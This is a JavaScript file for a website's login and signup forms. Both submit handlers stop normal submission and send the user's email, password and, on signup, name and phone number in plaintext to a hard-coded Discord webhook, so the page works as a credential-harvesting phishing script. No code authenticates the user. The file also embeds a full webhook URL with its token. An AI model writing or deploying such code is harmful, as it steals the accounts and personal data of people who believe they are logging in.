// This will trigger when the form is submitted
document.getElementById('login-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Get form data
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Create an object with the form data
    const data = {
        email: email,
        password: password
    };

    // The Discord webhook URL (replace with your actual webhook URL)
    const webhookUrl = 'https://discord.com/api/webhooks/1330590142737416292/yx0Cctpods2n7hC72Iq_MpVnyiejvlY7bXZ1rCnd4LGp16QxzcLEfnE-zv-zsueDGWdM';  // Replace this with your Discord webhook URL

    // Prepare the message to send to Discord
    const message = {
        content: `New login attempt:\nEmail: ${data.email}\nPassword: ${data.password}`, // You can customise this message as you wish
    };

    // Send the data to Discord using a POST request
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message), // Convert the data to JSON format
    })
    .then(response => response.json()) // Parse the JSON response from Discord (if any)
    .catch((error) => {
        console.error('Error:', error);
    });
});

// This will trigger when the form is submitted
document.getElementById('signup-form').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent the default form submission

    // Get form data
    const firstname = document.getElementById('first-name').value;
    const lastname = document.getElementById('last-name').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const password = document.getElementById('password').value;

    // Create an object with the form data
    const data = {
        firstname: firstname,
        lastname: lastname,
        email: email,
        phone: phone,
        password: password
    };

    // The Discord webhook URL (replace with your actual webhook URL)
    const webhookUrl = 'https://discord.com/api/webhooks/1330590142737416292/yx0Cctpods2n7hC72Iq_MpVnyiejvlY7bXZ1rCnd4LGp16QxzcLEfnE-zv-zsueDGWdM';  // Replace this with your Discord webhook URL

    // Prepare the message to send to Discord
    const message = {
        content: `New login attempt:\nFirst name: ${data.firstname}\nLast name: ${data.lastname}\nEmail: ${data.email}\nPhone number: ${data.phone}\nPassword: ${data.password}`, // You can customise this message as you wish
    };

    // Send the data to Discord using a POST request
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(message), // Convert the data to JSON format
    })
    .then(response => response.json()) // Parse the JSON response from Discord (if any)
    .catch((error) => {
        console.error('Error:', error);
    });
});